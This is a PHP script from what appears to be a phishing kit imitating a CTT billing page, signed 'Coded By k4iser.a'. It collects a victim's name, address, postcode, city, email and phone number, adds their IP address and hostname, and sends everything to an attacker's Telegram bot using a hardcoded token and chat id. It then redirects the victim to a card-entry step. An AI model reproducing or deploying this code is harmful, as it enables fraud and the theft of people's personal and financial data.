<?php

session_start();

$name=$_POST["name"];
$address=$_POST["address"];
$zip=$_POST["zip"];
$city=$_POST["city"];
$state=$_POST["state"];
$email=$_POST["email"];
$phone=$_POST["phone"];
$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['name'] = $name;
        $_SESSION['address'] = $address;
        $_SESSION['zip'] = $zip;
        $_SESSION['city'] = $city;
		$_SESSION['state'] = $state;
        $_SESSION['email'] = $email;
        $_SESSION['phone'] = $phone;



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|BILLING CTT-CH |----------|\n";
$message .= "Name  : ".$_SESSION['name']."\n";
$message .= "Address    : ".$_SESSION['address']."\n";
$message .= "ZIP    : ".$_SESSION['zip']."\n";
$message .= "CITY    : ".$_SESSION['city']."\n";
$message .= "STATE    : ".$_SESSION['state']."\n";
$message .= "EMAIL    : ".$_SESSION['email']."\n";
$message .= "PHONE    : ".$_SESSION['phone']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-CTT-CH>- Coded By k4iser.a ~ | $ip";


$token = "7216603666:AAHxvOD_-5evGiaW4GIa9uyG4-opdeV3Pu8";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4205027125&text=" . urlencode($message)."" );
header("location:choice.php?vc?__event=card&service_id=top_card=AU")
?>